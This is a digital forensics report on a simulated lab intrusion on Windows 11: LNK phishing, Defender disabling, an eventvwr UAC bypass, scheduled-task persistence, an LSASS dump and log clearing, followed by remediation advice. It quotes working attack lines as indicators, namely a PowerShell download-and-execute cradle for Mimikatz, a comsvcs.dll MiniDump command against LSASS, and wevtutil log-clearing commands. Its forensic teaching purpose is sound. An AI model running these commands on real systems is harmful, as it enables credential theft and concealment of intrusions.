# DFIR Investigation Report: Spearphishing to Credential Compromise

## 1. Executive Summary

On September 2, 2026, a forensic investigation was initiated on a compromised Windows endpoint. The analysis revealed a targeted attack chain that began with a malicious spearphishing shortcut (.lnk) disguised as an invoice. The threat actor successfully gained initial access, disabled endpoint protections, escalated privileges via a UAC bypass, and performed credential dumping using Living off the Land (LotL) techniques. Finally, the attacker cleared the Windows Event Logs to evade detection. This report details the forensic artifacts recovered, the reconstructed attack timeline, and actionable remediation steps.

## 2. Investigation Scope & Environment

The forensic analysis was conducted in a controlled, isolated laboratory environment to ensure the integrity of the evidence.

- **Victim Environment:** 1x Windows 11 Virtual Machine (Target Endpoint)
- **Forensic Environment:** 1x Windows 11 Virtual Machine (Analysis Workstation)
- **Methodology:** Dead-box forensics (analyzing the acquired disk image without booting the victim OS) to preserve MACB timestamps and artifact integrity.
- **Key Forensic Tools Utilized:** Autopsy, Zimmerman's Registry Explorer, PECmd (Prefetch Explorer), Windows Event Viewer, and Sysmon.

## 3. Incident Timeline & Attack Reconstruction

By correlating artifacts across the Master File Table (MFT), Prefetch, UserAssist, and Sysmon, the following chronological attack timeline was reconstructed:

| Timestamp (UTC) | Phase | Process / Event | Description |
|---|---|---|---|
| 15:43:43 | Defense Evasion | Event ID 5001 | Real-time Protection on Microsoft Defender Antivirus was manually disabled. |
| 15:44:16 | Command & Control | powershell.exe | DNS query and successful connection to external IP (20.205.243.166). |
| 15:45:37 | Preparation | MFT Entry | Creation of the malicious LNK payload (`CompanyA_Invoice.pdf.lnk`) on the Desktop. |
| 15:46:23 | Initial Access | NOTEPAD.EXE | The user executed the LNK file. Notepad was launched as a decoy application. |
| 15:46:30 | Discovery | WHOAMI.EXE | Automated reconnaissance scripts executed to verify system and user identity. |
| 15:46:33 | Execution | POWERSHELL.EXE | Fileless execution of Invoke-Mimikatz.ps1 loaded directly into memory via IEX. |
| 15:47:01 | Persistence | SCHTASKS.EXE | Creation of two Scheduled Tasks (OnLogon and OnStartUp) to maintain access. |
| 15:47:11 | Privilege Escalation | CMD.EXE | UAC Bypass executed via eventvwr.msc registry hijacking, spawning an elevated shell. |
| 15:47:37 | Credential Access | RUNDLL32.EXE | LSASS memory dumped using comsvcs.dll (MiniDump) to extract credentials. |
| 15:47:55 | Defense Evasion | WEVTUTIL.EXE | The attacker cleared the Security, System, and Application event logs. |

## 4. Forensic Analysis & MITRE ATT&CK Mapping

### 4.1. Initial Access & Execution (T1566.001, T1059.001)

The investigation identified the entry point as a malicious shortcut file.

- **MFT & UserAssist:** Analysis of the Master File Table and UserAssist registry key (`{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}`) confirmed the execution of `C:\Users\Victim\Desktop\CompanyA_Invoice.pdf.lnk`.
- **Prefetch:** At 15:46:23, `NOTEPAD.EXE` was executed twice. This served as a visual decoy for the user while the actual payload ran in the background.
- **Sysmon (Event ID 1):** At 15:46:33, a critical Indicator of Compromise (IoC) was captured. A PowerShell process executed a fileless payload designed to download and run Mimikatz directly in memory:

```
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/.../Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```

### 4.2. Persistence (T1053.005)

To survive system reboots, the attacker utilized Windows Task Scheduler.

- **Artifacts:** Sysmon Event ID 1 and Prefetch records for `SCHTASKS.EXE` logged the creation of two anomalous tasks at 15:47:01.
- **Configuration:** The tasks, named `T1053_OnLogon` and `T1053_OnStartUp`, were configured to execute `cmd.exe /c calc.exe` (acting as a placeholder/benign payload in this scenario) upon user authentication and system boot, respectively.

### 4.3. Privilege Escalation via UAC Bypass (T1548.002)

The attacker successfully elevated their privileges from a standard user to an Administrator without triggering a User Account Control (UAC) prompt.

- **Registry Hijacking:** Sysmon logs at 15:47:11 revealed the exact mechanism: an Event Viewer (`eventvwr.msc`) UAC bypass. The attacker hijacked the registry path `HKCU:\software\classes\mscfile\shell\open\command`.
- **Execution:** When `eventvwr.msc` was subsequently called, it automatically read the tampered registry key and spawned a high-integrity `cmd.exe` session.

### 4.4. Credential Access via LotL (T1003.001)

With elevated privileges, the attacker targeted the Local Security Authority Subsystem Service (LSASS) to harvest credentials.

- **LotL Technique:** Instead of dropping a known hacking tool to disk, the attacker used a "Living off the Land" technique. Sysmon logs at 15:47:37 recorded `rundll32.exe` invoking a native Windows component, `comsvcs.dll`.
- **Command Line:**

```
rundll32.exe C:\windows\System32\comsvcs.dll MiniDump 840 C:\Users\Victim\AppData\Local\Temp\lsass-comsvcs.dmp full
```

- **Impact:** The command explicitly targeted Process ID 840 (LSASS) and wrote a full memory dump to a hidden temporary directory, enabling offline extraction of NTLM hashes and plaintext passwords.

### 4.5. Defense Evasion (T1070.001)

- **Antivirus Tampering:** The attack was preceded by the manual disabling of Microsoft Defender Antivirus Real-time Protection at 15:43:43 (Windows Event ID 5001).
- **Log Clearing:** At 15:47:55, Prefetch and Sysmon captured the execution of `WEVTUTIL.EXE`. The attacker issued commands (`cl Security`, `cl System`, `cl Application`) to wipe the primary Windows Event Logs, a classic anti-forensic maneuver designed to blind investigators.

## 5. Incident Response & Remediation Plan

Based on the forensic findings, the following response plan is recommended to secure the environment and prevent future recurrences:

### 5.1. Containment & Eradication

- **Isolate the Endpoint:** Immediately disconnect the compromised Windows 11 virtual machine from the corporate network to prevent lateral movement via the compromised credentials.
- **Remove Persistence Mechanisms:** Delete the identified Scheduled Tasks (`T1053_OnLogon` and `T1053_OnStartUp`) from the Task Scheduler.
- **Registry Cleanup:** Revert the tampered registry key (`HKCU:\software\classes\mscfile\shell\open\command`) to its default state to neutralize the UAC bypass vulnerability.
- **Artifact Removal:** Delete the malicious LNK file from the user's Desktop and securely wipe the `lsass-comsvcs.dmp` file from the `AppData\Local\Temp` directory.

### 5.2. Recovery & Post-Incident Activity

- **Credential Reset:** Force a password reset for the compromised user account (Victim) and any domain administrator accounts that may have been exposed in the LSASS memory space.
- **Restore Endpoint Defenses:** Re-enable Microsoft Defender Antivirus Real-Time Protection and ensure cloud-delivered protection is active.

### 5.3. Strategic Prevention (Lessons Learned)

- **Block LNK Attachments:** Configure email gateways and endpoint proxies to block or quarantine `.lnk` files, neutralizing the initial access vector.
- **Enable LSA Protection:** Configure the registry (`RunAsPPL=1`) or enable Windows Defender Credential Guard to prevent even elevated administrators from dumping LSASS memory.
- **Centralized Log Forwarding:** Implement a SIEM solution to ingest Windows Event Logs and Sysmon data in real-time. This ensures that even if local logs are cleared using `wevtutil.exe`, the forensic evidence is preserved securely off-host.

---

**Disclaimer:** This investigation was conducted entirely within an isolated, controlled lab environment for educational and portfolio purposes. All indicators of compromise, tools, and payloads referenced were used solely for simulation and forensic analysis training.
